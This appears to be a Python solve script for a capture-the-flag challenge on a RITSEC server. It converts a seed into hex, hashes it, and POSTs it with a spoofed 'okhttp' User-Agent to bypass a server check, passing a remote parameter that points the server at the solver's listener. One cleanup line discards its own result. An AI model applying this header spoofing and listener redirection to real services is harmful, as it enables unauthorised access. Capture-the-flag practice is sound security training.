import requests
import hashlib


def twos_complement(decimal_num, num_bits):
    # Compute the two's complement of a decimal number
    if decimal_num < 0:
        # If the number is negative, compute the positive equivalent
        positive_equiv = (1 << num_bits) + decimal_num
        # Convert the positive equivalent to its binary representation
        binary_equiv = bin(positive_equiv)[2:].zfill(num_bits)
    else:
        # If the number is positive, convert it directly to binary
        binary_equiv = bin(decimal_num)[2:].zfill(num_bits)

    # Convert the binary representation to hexadecimal
    hex_equiv = hex(int(binary_equiv, 2))[2:].upper()

    return hex_equiv


def main():

    # ip and port of server, and ip and port of your listener
    URL='http://the-andro-experiment.ctf.ritsec.club:5000/experiment?remote=192.168.0.1:1338'
    seed = ""

    # This just takes the seed that solve.js gets and converts it to the format that the server expects
    for num in input("Insert seed: ").split(","):

        if "-" in num:
            seed += "\\x"+twos_complement(int(num,10),8)
        else:
            seed += hex(int(num,10))

    print(seed)

    # Cleanup the seed
    seed.replace("0x","\\x")

    # Encrypt the seed
    payload = hashlib.sha256(bytes(seed, 'utf-8')).digest()

    # Set header so it passes the check
    headers = {'User-Agent': 'okhttp'}
    
    print(payload)
    requests.post(url=URL, data=payload, headers=headers)

if __name__ == "__main__":
    main()
